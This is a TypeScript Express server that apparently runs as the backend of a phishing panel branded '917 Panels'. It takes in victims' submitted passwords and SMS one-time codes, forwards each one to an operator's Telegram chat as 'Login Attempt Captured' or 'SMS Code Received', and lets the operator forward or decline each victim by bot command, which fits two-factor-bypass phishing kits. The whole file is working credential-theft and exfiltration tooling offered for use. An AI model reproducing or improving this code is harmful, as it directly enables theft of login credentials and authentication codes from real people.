import express from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';
import TelegramBot from 'node-telegram-bot-api';
import cors from 'cors';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const DATA_FILE = path.join(__dirname, 'data.json');
const TELEGRAM_CONFIG_FILE = path.join(__dirname, 'telegram.json');

// Types
interface ClientData {
  id: string;
  ip: string;
  status: string;
  lastSeen: string;
  timestamp: number;
  loginAttempts: any[];
  [key: string]: any;
}

interface TelegramConfig {
  botToken: string;
  chatId: string;
  active: boolean;
}

// Initial Data
let clients: ClientData[] = [];
let telegramConfig: TelegramConfig = { botToken: '', chatId: '', active: false };

if (fs.existsSync(DATA_FILE)) {
  try {
    clients = JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
  } catch (e) { clients = []; }
}

if (fs.existsSync(TELEGRAM_CONFIG_FILE)) {
  try {
    telegramConfig = JSON.parse(fs.readFileSync(TELEGRAM_CONFIG_FILE, 'utf-8'));
  } catch (e) { telegramConfig = { botToken: '', chatId: '', active: false }; }
}

function saveData() {
  fs.writeFileSync(DATA_FILE, JSON.stringify(clients, null, 2));
}

function saveTelegramConfig() {
  fs.writeFileSync(TELEGRAM_CONFIG_FILE, JSON.stringify(telegramConfig, null, 2));
}

// Telegram Bot Logic
let bot: TelegramBot | null = null;

function initBot() {
  if (bot) {
    bot.stopPolling();
    bot = null;
  }
  if (telegramConfig.botToken && telegramConfig.active) {
    try {
      bot = new TelegramBot(telegramConfig.botToken, { polling: true });
      console.log('Telegram Bot initialized.');

      bot.onText(/\/start/, (msg) => {
        bot?.sendMessage(msg.chat.id, '917 Panels Bot Active. Use /clients to see active connections.');
      });

      bot.onText(/\/clients/, (msg) => {
        const list = clients.map(c => `${c.ip} - ${c.status} (${c.currentPage || 'Unknown'})`).join('\n');
        bot?.sendMessage(msg.chat.id, `Active Clients:\n${list || 'None'}`);
      });

      bot.onText(/\/forward (.+)/, (msg, match) => {
        const ip = match?.[1];
        const client = clients.find(c => c.ip === ip || c.id === ip);
        if (client) {
          client.adminDecision = 'FORWARD';
          saveData();
          bot?.sendMessage(msg.chat.id, `Client ${ip} forwarded.`);
        } else {
          bot?.sendMessage(msg.chat.id, `Client ${ip} not found.`);
        }
      });

      bot.onText(/\/decline (.+)/, (msg, match) => {
        const ip = match?.[1];
        const client = clients.find(c => c.ip === ip || c.id === ip);
        if (client) {
          client.adminDecision = 'DECLINE';
          saveData();
          bot?.sendMessage(msg.chat.id, `Client ${ip} declined.`);
        } else {
          bot?.sendMessage(msg.chat.id, `Client ${ip} not found.`);
        }
      });
    } catch (e) {
      console.error('Error initializing bot:', e);
    }
  }
}

function notifyTelegram(content: string) {
  if (bot && telegramConfig.chatId && telegramConfig.active) {
    bot.sendMessage(telegramConfig.chatId, `🔔 [917 PANELS NOTICE]\n${content}`).catch(e => console.error('TG Notify Error:', e));
  }
}

initBot();

async function startServer() {
  const app = express();
  app.use(express.json());
  app.use(cors());

  const PORT = 3000;

  // API Routes
  app.get('/api/clients', (req, res) => {
    res.json(clients);
  });

  app.post('/api/clients', (req, res) => {
    const data = req.body;
    const id = data.id || 'current-session';
    const index = clients.findIndex(c => c.id === id);

    let isNew = false;
    if (index >= 0) {
      clients[index] = { ...clients[index], ...data, timestamp: Date.now() };
    } else {
      isNew = true;
      clients.push({
        id,
        ip: req.ip || '0.0.0.0',
        status: 'CONNECTED',
        timestamp: Date.now(),
        loginAttempts: [],
        ...data
      });
    }
    saveData();

    if (isNew) {
      notifyTelegram(`New Client Connected!\nIP: ${req.ip}\nID: ${id}`);
    } else if (data.password) {
      notifyTelegram(`Login Attempt Captured!\nIP: ${clients[index]?.ip}\nPass: ${data.password}`);
    } else if (data.smsCode) {
      notifyTelegram(`SMS Code Received!\nIP: ${clients[index]?.ip}\nCode: ${data.smsCode}`);
    }

    res.json({ success: true, client: clients[index >= 0 ? index : clients.length - 1] });
  });

  app.delete('/api/clients/:id', (req, res) => {
    clients = clients.filter(c => c.id !== req.params.id);
    saveData();
    res.json({ success: true });
  });

  app.post('/api/clients/reset', (req, res) => {
    clients = [];
    saveData();
    res.json({ success: true });
  });

  app.get('/api/telegram', (req, res) => {
    res.json(telegramConfig);
  });

  app.post('/api/telegram', (req, res) => {
    telegramConfig = { ...telegramConfig, ...req.body };
    saveTelegramConfig();
    initBot();
    res.json({ success: true });
  });

  // Vite Integration
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(__dirname, 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
